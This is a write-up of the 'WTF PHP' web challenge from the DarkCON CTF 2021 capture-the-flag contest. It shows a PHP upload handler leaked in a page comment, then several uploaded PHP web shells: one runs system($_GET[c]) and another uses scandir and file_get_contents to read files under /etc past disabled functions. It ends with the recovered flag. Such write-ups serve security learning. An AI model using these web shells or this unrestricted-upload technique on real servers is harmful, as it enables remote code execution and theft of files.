<h1>DarkCON CTF 2021 â€“ WTF PHP</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 269</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Your php function didnt work? maybe some info will help you xD PS: Flag is somewhere in /etc Note: This chall does not require any brute forcing</p>
  
  <p>http://wtf-php.darkarmy.xyz/</p>
</blockquote>

<h2>Solution</h2>

<p>The website allows to upload a file. Analyzing the HTML you can discover an interesting comment containing a PHP snippet.</p>

<p>```html
<html>
   <body>
      <form action="" method="POST" enctype="multipart/form-data">
         <input type="file" name="fileData" />
         <input type="submit"/>
      </form>
   </body>
<!--
   if(isset($<em>FILES['fileData'])){
      if($</em>FILES['fileData']['size'] &gt; 1048576){
         $errors='File size must be excately 1 MB';
      }</p>

<pre><code>  if(empty($errors)==true){
    $uploadedPath = "uploads/".rand().".".explode(".",$_FILES['fileData']['name'])[1];
    move_uploaded_file($_FILES['fileData']['tmp_name'],$uploadedPath);
    echo "File uploaded successfully\n";
    echo '&lt;p&gt;&lt;a href='. $uploadedPath .' target="_blank"&gt;File&lt;/a&gt;&lt;/p&gt;';
  }else{
     echo $errors;
  }
</code></pre>

<p>}
--></p>

<p></html>
```</p>

<p>The website returns you a link to the uploaded file, it renames the file with a random value preserving the extension. So, a PHP shell can be uploaded and visited executing its content.</p>

<p><code>php
&lt;?php
    echo "&lt;h1&gt;Exploit Output&lt;/h1&gt;&lt;br /&gt;&lt;code&gt;";
    echo system($_GET[c]);
    echo "&lt;/code&gt;";
?&gt;
</code></p>

<p>Unfortunately the RCE doesn't work, but the text says:</p>

<blockquote>
  <p>maybe some info will help you xD</p>
</blockquote>

<p>So you can try to understand what's happening using <code>phpinfo()</code>.</p>

<p><code>php
&lt;?php
    echo "&lt;h1&gt;Exploit Output&lt;/h1&gt;&lt;br /&gt;&lt;hr /&gt;&lt;code&gt;";
    echo system($_GET[c]);
    echo "&lt;/code&gt;&lt;hr /&gt;";
    echo phpinfo();
?&gt;
</code></p>

<p>Some functions are disabled, you can see them under <code>disable_functions</code> section of <code>phpinfo()</code> output.</p>

<p><code>
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,link,symlink,syslog,ld,mail,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,highlight_file,file,fopen,fread,var_dump,readfile
</code></p>

<p><code>scandir</code> and <code>file_get_contents</code> are not disabled and the flag is under <code>/etc</code>.</p>

<p>A simple <a href="exploit.php">exploit</a> can be created and uploaded.</p>

<p><code>php
&lt;?php
    echo "&lt;h1&gt;Exploit Output&lt;/h1&gt;&lt;br /&gt;&lt;hr /&gt;";
    $dir = "/etc/";
    $items = scandir($dir);
    foreach($items as $key =&gt; $value) {
        $file = $dir . $value;
        if(is_file($file)) {
            $file_content = file_get_contents($file);
            if(strpos($file_content, "darkCON{") !== false) {
                echo "&lt;p&gt;File name: $file&lt;/p&gt;&lt;br /&gt;File content:&lt;br /&gt;&lt;code&gt;";
                echo $file_content;
                echo "&lt;/code&gt;";
            }
        }
    }
    echo "&lt;hr /&gt;";
    echo phpinfo();
?&gt;
</code></p>

<p>The exploit output will be the following.</p>

<p>```
File name: /etc/f1@g.txt</p>

<p>File content:
darkCON{us1ng<em>3</em>y34r<em>01d</em>bug<em>t0</em>byp4ss<em>d1s4ble</em>funct10n}
```</p>
